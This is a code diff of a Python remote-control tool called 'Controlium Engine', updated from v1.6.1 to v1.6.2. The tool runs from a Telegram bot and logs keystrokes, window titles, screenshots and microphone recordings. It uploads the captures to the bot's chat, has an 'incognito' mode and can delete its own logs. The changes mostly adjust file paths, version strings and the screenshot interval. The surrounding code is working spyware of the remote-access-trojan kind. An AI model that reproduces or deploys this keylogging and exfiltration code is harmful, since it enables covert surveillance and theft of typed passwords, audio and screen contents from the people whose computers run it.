@@ -25,7 +25,7 @@ import screen_brightness_control as scrn
 from scipy.io.wavfile import write
 
 
-BOT_TOKEN = "YOUR BOT TOKEN"
+BOT_TOKEN = "YOUR TOKEN"
 
 def telegram_alert(send):
     bot_token = BOT_TOKEN
@@ -45,12 +45,11 @@ def command_unit(message):
 
     try:
         if message.text.lower() == "/stop":
-            notification.notify(
-                title="Windows notification",
-                message="Controlium engine shutdown",
-                app_icon=None,
-                timeout=3,)
-            
+            # notification.notify(
+            #     title="Windows notification",
+            #     message="Controlium engine shutdown",
+            #     app_icon=None,
+            #     timeout=3,)
             bot.reply_to(message, "Engine shutdown")
             subprocess.run(["taskkill", "/F", "/PID", str(pid)])
 
@@ -72,7 +71,7 @@ def command_unit(message):
 
         elif message.text.lower() == "/sslog":
             try:
-                with open("controlium-ss.jpg", 'rb') as file:
+                with open("Activity/controlium-ss.jpg", 'rb') as file:
                     bot.send_document(message.chat.id, file)
 
             except Exception as e:
@@ -136,11 +135,11 @@ def command_unit(message):
 
         elif message.text.lower() == "/ss":
             screenshot = pyautogui.screenshot()
-            screenshot.save("controlium-ss.jpg")
+            screenshot.save("Activity/controlium-ss.jpg")
             bot.reply_to(message, "Screenshot taken")
 
             try:
-                with open("controlium-ss.jpg", 'rb') as file:
+                with open("Activity/controlium-ss.jpg", 'rb') as file:
                     bot.send_document(message.chat.id, file)
 
             except Exception as e:
@@ -153,11 +152,11 @@ def command_unit(message):
             duration = 10
             record_audio = sd.rec(int(duration * frequency), samplerate=frequency, channels=2)
             sd.wait()
-            write("Audio/controlium-rec.wav", frequency, record_audio)
+            write("Activity/controlium-rec.wav", frequency, record_audio)
             bot.reply_to(message, "Audio recorded")
 
             try:
-                with open("Audio/controlium-rec.wav", 'rb') as file:
+                with open("Activity/controlium-rec.wav", 'rb') as file:
                     bot.send_document(message.chat.id, file)
 
             except Exception as e:
@@ -235,10 +234,6 @@ def command_unit(message):
             pyautogui.hotkey('ctrl', 'z')
             bot.reply_to(message, "Done")
 
-        elif message.text.lower() == "/copy":
-            pyautogui.hotkey('ctrl', 'c')
-            bot.reply_to(message, "Done")
-
         elif message.text.lower() == "/paste":
             pyautogui.hotkey('ctrl', 'v')
             bot.reply_to(message, "Done")
@@ -296,10 +291,10 @@ def command_unit(message):
                 os.remove(os.path.join(key_log, f))
             bot.reply_to(message, "Deleted keystroke logs")
 
-            os.remove("controlium-ss.jpg")
+            os.remove("Activity/controlium-ss.jpg")
             bot.reply_to(message, "Deleted screenshot")
 
-            os.remove("Audio/controlium-rec.wav")
+            os.remove("Activity/controlium-rec.wav")
             bot.reply_to(message, "Deleted audio file")
 
         elif "clean" in message.text.lower():
@@ -334,7 +329,7 @@ def command_unit(message):
             bot.reply_to(message, f"Searching {query}")
 
         elif message.text.lower() == "/version":
-            bot.reply_to(message, "Controlium Engine v1.6.1")
+            bot.reply_to(message, "Controlium Engine v1.6.2")
 
         else:
             bot.reply_to(message, "Invalid command")
@@ -385,12 +380,12 @@ def windows_logger():
         open_windows = gw.getWindowsWithTitle("")
         for window in open_windows:
             if window.title not in logged_windows:
-                logging.info(f"Opened {window.title}")
+                logging.info(f"Opened : {window.title}")
                 logged_windows.add(window.title)
 
         for title in logged_windows.copy():
             if title not in gw.getAllTitles():
-                logging.info(f"Closed {title}")
+                logging.info(f"Closed : {title}")
                 logged_windows.remove(title)
     except:
         pass
@@ -401,10 +396,10 @@ def key_press(key):
 
         try:
             with open(key_log_file, "a") as f:
-                f.write(f"Key pressed: {key.char}\n")
+                f.write(f"Key pressed : {key.char}\n")
         except AttributeError:
             with open(key_log_file, "a") as f:
-                f.write(f"Key pressed: {key}\n")
+                f.write(f"Key pressed : {key}\n")
 
 def key_release(key):
     if key == keyboard.Key.esc:
@@ -414,7 +409,7 @@ def key_release(key):
 def keystroke_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.6.1
+        f.write(f'''CONTROLIUM ENGINE v1.6.2
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -434,7 +429,7 @@ def keystroke_logger():
 
 def activity_logger():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.6.1
+    logging.info(f'''CONTROLIUM ENGINE v1.6.2
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -451,9 +446,9 @@ def activity_logger():
         if incognito != True:
             windows_logger()
         
-            time.sleep(5)
+            time.sleep(120)
             screenshot = pyautogui.screenshot()
-            screenshot.save("controlium-ss.jpg")
+            screenshot.save("Activity/controlium-ss.jpg")
 
 
 def network_connection():
@@ -543,8 +538,7 @@ if __name__ == "__main__":
 
 
 # MIT License
-# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.6.1
+# Copyright (c) 2024 Ashfaaq Rifath - Controlium Engine v1.6.2
 # All rights reserved.
 
-# T6 Engine
 # USE WITH CAUSION
